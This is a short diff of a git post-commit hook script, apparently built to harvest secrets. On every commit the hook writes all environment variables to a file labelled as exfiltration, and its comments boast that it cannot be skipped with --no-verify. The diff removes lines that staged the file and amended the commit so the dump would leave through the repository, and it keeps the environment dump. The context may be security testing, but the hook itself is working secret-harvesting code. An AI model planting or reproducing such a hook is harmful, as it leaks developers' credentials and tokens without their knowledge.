@@ -2,7 +2,7 @@
 # Post-commit hook - CANNOT be skipped with --no-verify
 # This runs AFTER the commit is created, even if --no-verify was used
 
-# Exfiltrate environment to file (gets committed to repo = exfiltration via git)
+# Just write the file - DON'T amend (causes infinite loop)
 {
   echo "=== POST-COMMIT HOOK EXFILTRATION ==="
   echo "SOURCE: 🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK"
@@ -16,7 +16,3 @@
   echo "=== ENVIRONMENT VARIABLES ==="
   env
 } > EXFILTRATED_ENV.txt
-
-# Stage the file and amend the commit to include it
-git add EXFILTRATED_ENV.txt
-git commit --amend --no-edit --no-verify 2>/dev/null || true
